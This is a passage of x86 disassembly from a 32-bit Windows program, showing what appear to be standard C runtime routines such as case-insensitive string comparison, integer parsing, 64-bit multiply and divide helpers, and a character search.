  428974:	dec    eax
  428975:	neg    eax
  428977:	sbb    eax,eax
  428979:	and    eax,0x103
  42897e:	lea    ecx,[ebp-0x8]
  428981:	push   ecx
  428982:	inc    eax
  428983:	push   eax
  428984:	push   DWORD PTR [ebp-0x4]
  428987:	push   ebx
  428988:	call   DWORD PTR ds:0x42906c
  42898e:	lea    esp,[ebp-0x54]
  428991:	pop    edi
  428992:	pop    esi
  428993:	pop    ebx
  428994:	leave  
  428995:	ret    
  428996:	int3   
  428997:	int3   
  428998:	int3   
  428999:	int3   
  42899a:	int3   
  42899b:	int3   
  42899c:	int3   
  42899d:	int3   
  42899e:	int3   
  42899f:	int3   
  4289a0:	push   ebp
  4289a1:	mov    ebp,esp
  4289a3:	push   edi
  4289a4:	push   esi
  4289a5:	push   ebx
  4289a6:	mov    esi,DWORD PTR [ebp+0xc]
  4289a9:	mov    edi,DWORD PTR [ebp+0x8]
  4289ac:	mov    al,0xff
  4289ae:	mov    edi,edi
  4289b0:	or     al,al
  4289b2:	je     0x4289e6
  4289b4:	mov    al,BYTE PTR [esi]
  4289b6:	add    esi,0x1
  4289b9:	mov    ah,BYTE PTR [edi]
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,al
  4289c0:	je     0x4289b0
  4289c2:	sub    al,0x41
  4289c4:	cmp    al,0x1a
  4289c6:	sbb    cl,cl
  4289c8:	and    cl,0x20
  4289cb:	add    al,cl
  4289cd:	add    al,0x41
  4289cf:	xchg   al,ah
  4289d1:	sub    al,0x41
  4289d3:	cmp    al,0x1a
  4289d5:	sbb    cl,cl
  4289d7:	and    cl,0x20
  4289da:	add    al,cl
  4289dc:	add    al,0x41
  4289de:	cmp    al,ah
  4289e0:	je     0x4289b0
  4289e2:	sbb    al,al
  4289e4:	sbb    al,0xff
  4289e6:	movsx  eax,al
  4289e9:	pop    ebx
  4289ea:	pop    esi
  4289eb:	pop    edi
  4289ec:	leave  
  4289ed:	ret    
  4289ee:	push   esi
  4289ef:	push   edi
  4289f0:	call   0x4252e9
  4289f5:	mov    edi,DWORD PTR [eax+0x64]
  4289f8:	cmp    edi,DWORD PTR ds:0x46308c
  4289fe:	je     0x428a07
  428a00:	call   0x42678f
  428a05:	mov    edi,eax
  428a07:	mov    esi,DWORD PTR [esp+0xc]
  428a0b:	cmp    DWORD PTR [edi+0x28],0x1
  428a0f:	movzx  eax,BYTE PTR [esi]
  428a12:	jle    0x428a22
  428a14:	push   0x8
  428a16:	push   eax
  428a17:	push   edi
  428a18:	call   0x428a76
  428a1d:	add    esp,0xc
  428a20:	jmp    0x428a2c
  428a22:	mov    ecx,DWORD PTR [edi+0x48]
  428a25:	movzx  eax,BYTE PTR [ecx+eax*2]
  428a29:	and    eax,0x8
  428a2c:	test   eax,eax
  428a2e:	je     0x428a33
  428a30:	inc    esi
  428a31:	jmp    0x428a0b
  428a33:	movzx  ecx,BYTE PTR [esi]
  428a36:	inc    esi
  428a37:	cmp    ecx,0x2d
  428a3a:	mov    edx,ecx
  428a3c:	je     0x428a43
  428a3e:	cmp    ecx,0x2b
  428a41:	jne    0x428a47
  428a43:	movzx  ecx,BYTE PTR [esi]
  428a46:	inc    esi
  428a47:	xor    eax,eax
  428a49:	cmp    ecx,0x30
  428a4c:	jl     0x428a58
  428a4e:	cmp    ecx,0x39
  428a51:	jg     0x428a58
  428a53:	sub    ecx,0x30
  428a56:	jmp    0x428a5b
  428a58:	or     ecx,0xffffffff
  428a5b:	cmp    ecx,0xffffffff
  428a5e:	je     0x428a6c
  428a60:	lea    eax,[eax+eax*4]
  428a63:	lea    eax,[ecx+eax*2]
  428a66:	movzx  ecx,BYTE PTR [esi]
  428a69:	inc    esi
  428a6a:	jmp    0x428a49
  428a6c:	cmp    edx,0x2d
  428a6f:	pop    edi
  428a70:	pop    esi
  428a71:	jne    0x428a75
  428a73:	neg    eax
  428a75:	ret    
  428a76:	push   ebp
  428a77:	mov    ebp,esp
  428a79:	push   ecx
  428a7a:	mov    eax,DWORD PTR [ebp+0xc]
  428a7d:	lea    ecx,[eax+0x1]
  428a80:	cmp    ecx,0x100
  428a86:	mov    ecx,DWORD PTR [ebp+0x8]
  428a89:	ja     0x428a94
  428a8b:	mov    ecx,DWORD PTR [ecx+0x48]
  428a8e:	movzx  eax,WORD PTR [ecx+eax*2]
  428a92:	jmp    0x428ae8
  428a94:	push   esi
  428a95:	mov    edx,eax
  428a97:	sar    edx,0x8
  428a9a:	push   edi
  428a9b:	mov    edi,DWORD PTR [ecx+0x48]
  428a9e:	movzx  esi,dl
  428aa1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428aa6:	pop    edi
  428aa7:	pop    esi
  428aa8:	je     0x428ab9
  428aaa:	and    BYTE PTR [ebp-0x2],0x0
  428aae:	push   0x2
  428ab0:	mov    BYTE PTR [ebp-0x3],al
  428ab3:	mov    BYTE PTR [ebp-0x4],dl
  428ab6:	pop    eax
  428ab7:	jmp    0x428ac3
  428ab9:	and    BYTE PTR [ebp-0x3],0x0
  428abd:	mov    BYTE PTR [ebp-0x4],al
  428ac0:	xor    eax,eax
  428ac2:	inc    eax
  428ac3:	push   0x1
  428ac5:	push   DWORD PTR [ecx+0x14]
  428ac8:	push   DWORD PTR [ecx+0x4]
  428acb:	lea    ecx,[ebp+0xe]
  428ace:	push   ecx
  428acf:	push   eax
  428ad0:	lea    eax,[ebp-0x4]
  428ad3:	push   eax
  428ad4:	push   0x1
  428ad6:	call   0x427b58
  428adb:	add    esp,0x1c
  428ade:	test   eax,eax
  428ae0:	jne    0x428ae4
  428ae2:	leave  
  428ae3:	ret    
  428ae4:	movzx  eax,WORD PTR [ebp+0xe]
  428ae8:	and    eax,DWORD PTR [ebp+0x10]
  428aeb:	leave  
  428aec:	ret    
  428aed:	int3   
  428aee:	int3   
  428aef:	int3   
  428af0:	mov    eax,DWORD PTR [esp+0x8]
  428af4:	mov    ecx,DWORD PTR [esp+0x10]
  428af8:	or     ecx,eax
  428afa:	mov    ecx,DWORD PTR [esp+0xc]
  428afe:	jne    0x428b09
  428b00:	mov    eax,DWORD PTR [esp+0x4]
  428b04:	mul    ecx
  428b06:	ret    0x10
  428b09:	push   ebx
  428b0a:	mul    ecx
  428b0c:	mov    ebx,eax
  428b0e:	mov    eax,DWORD PTR [esp+0x8]
  428b12:	mul    DWORD PTR [esp+0x14]
  428b16:	add    ebx,eax
  428b18:	mov    eax,DWORD PTR [esp+0x8]
  428b1c:	mul    ecx
  428b1e:	add    edx,ebx
  428b20:	pop    ebx
  428b21:	ret    0x10
  428b24:	int3   
  428b25:	int3   
  428b26:	int3   
  428b27:	int3   
  428b28:	int3   
  428b29:	int3   
  428b2a:	int3   
  428b2b:	int3   
  428b2c:	int3   
  428b2d:	int3   
  428b2e:	int3   
  428b2f:	int3   
  428b30:	push   ebp
  428b31:	mov    ebp,esp
  428b33:	push   edi
  428b34:	push   esi
  428b35:	push   ebx
  428b36:	mov    ecx,DWORD PTR [ebp+0x10]
  428b39:	or     ecx,ecx
  428b3b:	je     0x428b8a
  428b3d:	mov    esi,DWORD PTR [ebp+0x8]
  428b40:	mov    edi,DWORD PTR [ebp+0xc]
  428b43:	mov    bh,0x41
  428b45:	mov    bl,0x5a
  428b47:	mov    dh,0x20
  428b49:	lea    ecx,[ecx+0x0]
  428b4c:	mov    ah,BYTE PTR [esi]
  428b4e:	or     ah,ah
  428b50:	mov    al,BYTE PTR [edi]
  428b52:	je     0x428b7b
  428b54:	or     al,al
  428b56:	je     0x428b7b
  428b58:	add    esi,0x1
  428b5b:	add    edi,0x1
  428b5e:	cmp    ah,bh
  428b60:	jb     0x428b68
  428b62:	cmp    ah,bl
  428b64:	ja     0x428b68
  428b66:	add    ah,dh
  428b68:	cmp    al,bh
  428b6a:	jb     0x428b72
  428b6c:	cmp    al,bl
  428b6e:	ja     0x428b72
  428b70:	add    al,dh
  428b72:	cmp    ah,al
  428b74:	jne    0x428b81
  428b76:	sub    ecx,0x1
  428b79:	jne    0x428b4c
  428b7b:	xor    ecx,ecx
  428b7d:	cmp    ah,al
  428b7f:	je     0x428b8a
  428b81:	mov    ecx,0xffffffff
  428b86:	jb     0x428b8a
  428b88:	neg    ecx
  428b8a:	mov    eax,ecx
  428b8c:	pop    ebx
  428b8d:	pop    esi
  428b8e:	pop    edi
  428b8f:	leave  
  428b90:	ret    
  428b91:	int3   
  428b92:	int3   
  428b93:	int3   
  428b94:	int3   
  428b95:	int3   
  428b96:	int3   
  428b97:	int3   
  428b98:	int3   
  428b99:	int3   
  428b9a:	int3   
  428b9b:	int3   
  428b9c:	int3   
  428b9d:	int3   
  428b9e:	int3   
  428b9f:	int3   
  428ba0:	push   esi
  428ba1:	mov    eax,DWORD PTR [esp+0x14]
  428ba5:	or     eax,eax
  428ba7:	jne    0x428bd1
  428ba9:	mov    ecx,DWORD PTR [esp+0x10]
  428bad:	mov    eax,DWORD PTR [esp+0xc]
  428bb1:	xor    edx,edx
  428bb3:	div    ecx
  428bb5:	mov    ebx,eax
  428bb7:	mov    eax,DWORD PTR [esp+0x8]
  428bbb:	div    ecx
  428bbd:	mov    esi,eax
  428bbf:	mov    eax,ebx
  428bc1:	mul    DWORD PTR [esp+0x10]
  428bc5:	mov    ecx,eax
  428bc7:	mov    eax,esi
  428bc9:	mul    DWORD PTR [esp+0x10]
  428bcd:	add    edx,ecx
  428bcf:	jmp    0x428c18
  428bd1:	mov    ecx,eax
  428bd3:	mov    ebx,DWORD PTR [esp+0x10]
  428bd7:	mov    edx,DWORD PTR [esp+0xc]
  428bdb:	mov    eax,DWORD PTR [esp+0x8]
  428bdf:	shr    ecx,1
  428be1:	rcr    ebx,1
  428be3:	shr    edx,1
  428be5:	rcr    eax,1
  428be7:	or     ecx,ecx
  428be9:	jne    0x428bdf
  428beb:	div    ebx
  428bed:	mov    esi,eax
  428bef:	mul    DWORD PTR [esp+0x14]
  428bf3:	mov    ecx,eax
  428bf5:	mov    eax,DWORD PTR [esp+0x10]
  428bf9:	mul    esi
  428bfb:	add    edx,ecx
  428bfd:	jb     0x428c0d
  428bff:	cmp    edx,DWORD PTR [esp+0xc]
  428c03:	ja     0x428c0d
  428c05:	jb     0x428c16
  428c07:	cmp    eax,DWORD PTR [esp+0x8]
  428c0b:	jbe    0x428c16
  428c0d:	dec    esi
  428c0e:	sub    eax,DWORD PTR [esp+0x10]
  428c12:	sbb    edx,DWORD PTR [esp+0x14]
  428c16:	xor    ebx,ebx
  428c18:	sub    eax,DWORD PTR [esp+0x8]
  428c1c:	sbb    edx,DWORD PTR [esp+0xc]
  428c20:	neg    edx
  428c22:	neg    eax
  428c24:	sbb    edx,0x0
  428c27:	mov    ecx,edx
  428c29:	mov    edx,ebx
  428c2b:	mov    ebx,ecx
  428c2d:	mov    ecx,eax
  428c2f:	mov    eax,esi
  428c31:	pop    esi
  428c32:	ret    0x10
  428c35:	int3   
  428c36:	int3   
  428c37:	int3   
  428c38:	int3   
  428c39:	int3   
  428c3a:	int3   
  428c3b:	int3   
  428c3c:	int3   
  428c3d:	int3   
  428c3e:	int3   
  428c3f:	int3   
  428c40:	lea    eax,[edx-0x1]
  428c43:	pop    ebx
  428c44:	ret    
  428c45:	lea    esp,[esp+0x0]
  428c4c:	lea    esp,[esp+0x0]
  428c50:	xor    eax,eax
  428c52:	mov    al,BYTE PTR [esp+0x8]
  428c56:	push   ebx
  428c57:	mov    ebx,eax
  428c59:	shl    eax,0x8
  428c5c:	mov    edx,DWORD PTR [esp+0x8]
  428c60:	test   edx,0x3
  428c66:	je     0x428c7d
  428c68:	mov    cl,BYTE PTR [edx]
  428c6a:	add    edx,0x1
  428c6d:	cmp    cl,bl
  428c6f:	je     0x428c40
  428c71:	test   cl,cl
  428c73:	je     0x428cc6
  428c75:	test   edx,0x3
  428c7b:	jne    0x428c68
  428c7d:	or     ebx,eax
  428c7f:	push   edi
  428c80:	mov    eax,ebx
  428c82:	shl    ebx,0x10
  428c85:	push   esi
  428c86:	or     ebx,eax
  428c88:	mov    ecx,DWORD PTR [edx]
  428c8a:	mov    edi,0x7efefeff
  428c8f:	mov    eax,ecx
  428c91:	mov    esi,edi
  428c93:	xor    ecx,ebx
  428c95:	add    esi,eax
  428c97:	add    edi,ecx
  428c99:	xor    ecx,0xffffffff
  428c9c:	xor    eax,0xffffffff
  428c9f:	xor    ecx,edi
  428ca1:	xor    eax,esi
  428ca3:	add    edx,0x4
  428ca6:	and    ecx,0x81010100
  428cac:	jne    0x428cca
  428cae:	and    eax,0x81010100
  428cb3:	je     0x428c88
  428cb5:	and    eax,0x1010100
  428cba:	jne    0x428cc4
  428cbc:	and    esi,0x80000000
  428cc2:	jne    0x428c88
  428cc4:	pop    esi
  428cc5:	pop    edi
  428cc6:	pop    ebx
  428cc7:	xor    eax,eax
  428cc9:	ret    
  428cca:	mov    eax,DWORD PTR [edx-0x4]
  428ccd:	cmp    al,bl
  428ccf:	je     0x428d07
  428cd1:	test   al,al
  428cd3:	je     0x428cc4
  428cd5:	cmp    ah,bl
  428cd7:	je     0x428d00
  428cd9:	test   ah,ah
  428cdb:	je     0x428cc4
  428cdd:	shr    eax,0x10
  428ce0:	cmp    al,bl
  428ce2:	je     0x428cf9
  428ce4:	test   al,al
  428ce6:	je     0x428cc4
  428ce8:	cmp    ah,bl
  428cea:	je     0x428cf2
  428cec:	test   ah,ah
  428cee:	je     0x428cc4
  428cf0:	jmp    0x428c88
  428cf2:	pop    esi
  428cf3:	pop    edi
  428cf4:	lea    eax,[edx-0x1]
  428cf7:	pop    ebx
  428cf8:	ret    
  428cf9:	lea    eax,[edx-0x2]
  428cfc:	pop    esi
  428cfd:	pop    edi
  428cfe:	pop    ebx
  428cff:	ret    
  428d00:	lea    eax,[edx-0x3]
  428d03:	pop    esi
  428d04:	pop    edi
  428d05:	pop    ebx
  428d06:	ret    
  428d07:	lea    eax,[edx-0x4]
  428d0a:	pop    esi
  428d0b:	pop    edi
  428d0c:	pop    ebx
  428d0d:	ret    
  428d0e:	jmp    DWORD PTR ds:0x429070
